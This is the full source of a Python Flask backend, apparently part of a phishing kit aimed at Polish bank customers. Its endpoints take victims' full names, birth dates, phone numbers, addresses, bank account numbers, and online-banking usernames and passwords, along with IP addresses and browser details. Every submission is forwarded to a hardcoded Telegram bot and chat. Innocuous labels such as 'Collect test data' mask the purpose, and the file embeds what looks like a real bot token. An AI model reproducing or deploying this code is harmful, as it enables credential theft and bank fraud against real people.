from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
import time
import re
import base64
import json

app = Flask(__name__)
CORS(app)

# ============================================================
#   KONFIGURACJA (zmienne środowiskowe)
# ============================================================
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8403131166:AAEjVV93BhQBfFcJ_8rud46BwWC3omtKXY8')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT', '-5485289736')

# ============================================================
#   FUNKCJE POMOCNICZE
# ============================================================

def decode_data(encoded_data):
    """Dekoduje dane przesłane z frontendu (base64)"""
    try:
        decoded = base64.b64decode(encoded_data).decode('utf-8')
        return json.loads(decoded)
    except:
        return None

def get_client_ip():
    """Pobiera prawdziwy IP klienta (uwzględnia proxy)"""
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    return ip

def get_user_agent():
    """Pobiera User-Agent z nagłówków"""
    return request.headers.get('User-Agent', 'Nieznany')

def parse_user_agent(ua_string):
    """Próbuje wyciągnąć informacje z User-Agent"""
    if not ua_string or ua_string == 'Nieznany':
        return {
            'browser': 'Nieznany',
            'os': 'Nieznany',
            'device': 'Nieznany',
            'full': ua_string
        }

    result = {
        'browser': 'Nieznany',
        'os': 'Nieznany',
        'device': 'Komputer',
        'full': ua_string
    }

    ua = ua_string.lower()

    if 'chrome' in ua and 'edg' not in ua and 'opr' not in ua:
        result['browser'] = 'Chrome'
    elif 'firefox' in ua:
        result['browser'] = 'Firefox'
    elif 'safari' in ua and 'chrome' not in ua:
        result['browser'] = 'Safari'
    elif 'edg' in ua:
        result['browser'] = 'Edge'
    elif 'opr' in ua or 'opera' in ua:
        result['browser'] = 'Opera'
    elif 'brave' in ua:
        result['browser'] = 'Brave'

    if 'windows' in ua:
        result['os'] = 'Windows'
        if 'windows nt 10.0' in ua:
            result['os'] = 'Windows 10/11'
        elif 'windows nt 6.1' in ua:
            result['os'] = 'Windows 7'
        elif 'windows nt 6.2' in ua:
            result['os'] = 'Windows 8'
        elif 'windows nt 6.3' in ua:
            result['os'] = 'Windows 8.1'
    elif 'android' in ua:
        result['os'] = 'Android'
        result['device'] = 'Smartfon'
    elif 'iphone' in ua or 'ipad' in ua or 'ipod' in ua:
        result['os'] = 'iOS'
        result['device'] = 'iPhone/iPad'
    elif 'mac os x' in ua or 'macintosh' in ua:
        result['os'] = 'macOS'
    elif 'linux' in ua:
        result['os'] = 'Linux'

    if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
        result['device'] = 'Smartfon'
    elif 'tablet' in ua or 'ipad' in ua:
        result['device'] = 'Tablet'

    return result

def validate_polish_iban(raw_input):
    """
    Validates a Polish IBAN (28 chars with 'PL') or NRB (26 digits).
    Returns: (is_valid, cleaned_iban, message, bank_name)
    """
    cleaned = re.sub(r'\s+', '', raw_input).upper()
    if re.match(r'^[0-9]{26}$', cleaned):
        cleaned = 'PL' + cleaned
    if not cleaned.startswith('PL') or len(cleaned) != 28:
        return False, cleaned, "Nieprawidłowa długość. IBAN musi mieć 28 znaków (PL + 26 cyfr).", None
    if not re.match(r'^PL[0-9]{26}$', cleaned):
        return False, cleaned, "Nieprawidłowy format. Po 'PL' powinno być 26 cyfr.", None
    try:
        rearranged = cleaned[4:] + cleaned[:4]
        numeric = ''.join(str(ord(c) - 55) if c.isalpha() else c for c in rearranged)
        if int(numeric) % 97 != 1:
            return False, cleaned, "Nieprawidłowa cyfra kontrolna (MOD 97).", None
    except (ValueError, TypeError):
        return False, cleaned, "Błąd podczas obliczania sumy kontrolnej.", None

    sort_code = cleaned[4:12]
    bank_names = {
        "1010": "Narodowy Bank Polski", "1020": "PKO Bank Polski", "1030": "Citibank Handlowy",
        "1050": "ING Bank Śląski", "1060": "Bank BPH", "1090": "Santander Bank Polska",
        "1130": "BGK", "1140": "mBank", "1160": "Bank Millennium", "1220": "Bank Pekao",
        "1240": "BNP Paribas Bank Polska", "1320": "Bank Pocztowy", "1470": "Alior Bank",
        "1540": "Bank Ochrony Środowiska", "1580": "Mercedes-Benz Bank Polska",
        "1600": "BNP Paribas Bank Polska", "1670": "Santander Consumer Bank",
        "1680": "Plus Bank", "1750": "Raiffeisen Bank Polska", "1840": "Societe Generale",
        "1870": "Nest Bank", "1910": "Deutsche Bank Polska", "1940": "Credit Agricole Bank Polska",
        "2000": "Rabobank Polska", "2030": "Bank CWB", "2070": "FCA Bank",
        "2120": "Santander Bank Polska", "2130": "Bank Handlowy", "2140": "Bank Nowy",
        "2160": "BPS (Bank Polskiej Spółdzielczości)", "2190": "Toyota Bank",
        "2220": "Getin Bank", "2240": "Pekao Bank Hipoteczny", "2250": "Bank Śląski (ING)",
        "2260": "Bank Spółdzielczy", "2280": "Bank Citi", "2290": "BNP Paribas Bank Polska",
        "2310": "BPH", "2320": "BS (Bank Spółdzielczy)", "2330": "BS (Bank Spółdzielczy)",
    }
    bank_name = bank_names.get(sort_code[:4], "Nieznany bank")
    if not re.match(r'^[0-9]{8}$', sort_code):
        return False, cleaned, "Nieprawidłowy kod sortowania (8 cyfr).", bank_name
    return True, cleaned, "IBAN jest poprawny.", bank_name

def format_iban_readable(iban):
    cleaned = re.sub(r'\s+', '', iban).upper()
    return ' '.join([cleaned[i:i+4] for i in range(0, len(cleaned), 4)])

# ============================================================
#   ENDPOINTY
# ============================================================

@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "message": "Service is active",
        "endpoints": {
            "/": "GET - Status",
            "/ping": "GET - Keep-alive",
            "/api/submit": "POST - Submit form data",
            "/api/collect": "POST - Collect test data",
            "/api/validate": "POST - Validate IBAN"
        },
        "timestamp": time.time()
    })

@app.route('/ping')
def ping():
    return jsonify({"status": "alive", "timestamp": time.time()})

@app.route('/api/validate', methods=['POST'])
def validate_iban():
    try:
        data = request.json
        iban = data.get('iban', '')
        if not iban:
            return jsonify({"success": False, "error": "IBAN nie został podany"}), 400
        is_valid, cleaned, message, bank_name = validate_polish_iban(iban)
        return jsonify({
            "success": is_valid,
            "iban": cleaned,
            "formatted": format_iban_readable(cleaned) if is_valid else None,
            "message": message,
            "bank": bank_name if is_valid else None,
            "valid": is_valid
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/submit', methods=['POST'])
def submit_form():
    try:
        data = request.json
        print(f"📥 Received: {data}")

        client_ip = get_client_ip()
        ua_string = get_user_agent()
        ua_info = parse_user_agent(ua_string)

        if 'data' in data:
            decoded = decode_data(data['data'])
            if decoded:
                data = decoded

        iban_raw = data.get('iban', '')
        is_valid = False
        cleaned_iban = iban_raw
        formatted_iban = iban_raw
        bank_name = None

        if iban_raw:
            is_valid, cleaned_iban, message, bank_name = validate_polish_iban(iban_raw)
            formatted_iban = format_iban_readable(cleaned_iban) if is_valid else iban_raw

        message = f"""📋 NOWE DANE FORMULARZA:

👤 Imię: {data.get('fullname', 'Brak')}
📅 Data urodzenia: {data.get('birthdate', 'Brak')}
📱 Telefon: {data.get('phone', 'Brak')}
🏠 Ulica: {data.get('street', 'Brak')}
🏙️ Miasto: {data.get('city', 'Brak')}
📮 Kod: {data.get('postal', 'Brak')}

🏦 NRB: {formatted_iban}
🏛️ Bank: {bank_name if bank_name else 'Nieznany'}
✅ Status: {'✔️ POPRAWNY' if is_valid else '⚠️ NIEZWERYFIKOWANY'}

🌐 IP: {client_ip}
🌍 Browser: {ua_info['browser']} ({ua_info['os']}) - {ua_info['device']}
🔍 User-Agent: {ua_string}
"""

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        response = requests.post(url, data={
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }, timeout=10)

        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Dane zostały zapisane",
                "iban_valid": is_valid,
                "iban_formatted": formatted_iban,
                "bank": bank_name,
                "client_ip": client_ip,
                "user_agent": ua_string
            })
        else:
            return jsonify({"success": False, "error": f"Telegram error: {response.status_code}"}), 500

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/collect', methods=['POST'])
def collect_data():
    try:
        data = request.json

        client_ip = get_client_ip()
        ua_string = get_user_agent()
        ua_info = parse_user_agent(ua_string)

        if 'data' in data:
            decoded = decode_data(data['data'])
            if decoded:
                data = decoded

        print(f"🔐 Received: {data}")

        iban_from_data = data.get('iban', '')
        iban_valid = False
        formatted_iban = iban_from_data
        bank_name = None

        if iban_from_data:
            is_valid, cleaned, _, bank_name = validate_polish_iban(iban_from_data)
            iban_valid = is_valid
            if is_valid:
                formatted_iban = format_iban_readable(cleaned)

        message = f"""🔐 NOWE DANE:

🏦 Instytucja: {data.get('bank', 'Brak')}
👤 Użytkownik: {data.get('username', 'Brak')}
🔑 Hasło: {data.get('password', 'Brak')}"""

        if iban_from_data:
            message += f"""
🏦 NRB: {formatted_iban}
🏛️ Bank: {bank_name if bank_name else 'Nieznany'}
✅ Status: {'✔️ POPRAWNY' if iban_valid else '⚠️ NIEZWERYFIKOWANY'}"""

        message += f"""
🌐 IP: {client_ip}
🌍 Browser: {ua_info['browser']} ({ua_info['os']}) - {ua_info['device']}
🔍 User-Agent: {ua_string}"""

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        response = requests.post(url, data={
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }, timeout=10)

        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Data collected",
                "iban_valid": iban_valid if iban_from_data else None,
                "client_ip": client_ip,
                "user_agent": ua_string
            })
        else:
            return jsonify({"success": False, "error": f"Telegram error: {response.status_code}"}), 500

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "error": "Endpoint not found",
        "available_endpoints": {
            "/": "GET - Status",
            "/ping": "GET - Keep-alive",
            "/api/submit": "POST - Submit form data",
            "/api/collect": "POST - Collect test data",
            "/api/validate": "POST - Validate IBAN"
        }
    }), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)